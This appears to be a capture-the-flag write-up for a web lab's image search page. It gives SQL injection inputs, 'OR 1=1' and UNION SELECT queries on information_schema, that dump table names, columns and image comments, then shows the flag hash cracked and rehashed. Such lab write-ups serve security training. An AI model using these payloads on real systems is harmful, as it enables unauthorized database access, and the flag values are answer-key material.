list_images

on the searchimg page you can perfom a sql injection with the following lines in the SEARCH IMG BY ID form,

get all imgs with : 1 OR 1=1 we find this img called Hack me ? with the id 5
get all tables with : 1 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables
-> we find the list_images table
get all colums with : 1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
-> we find the title and comment column in the list_images table
get all img and their comments with : 1 OR 1=1 UNION SELECT title, comment FROM list_images


comment == If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

after md5 decode == albatroz
after sha256 == F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188
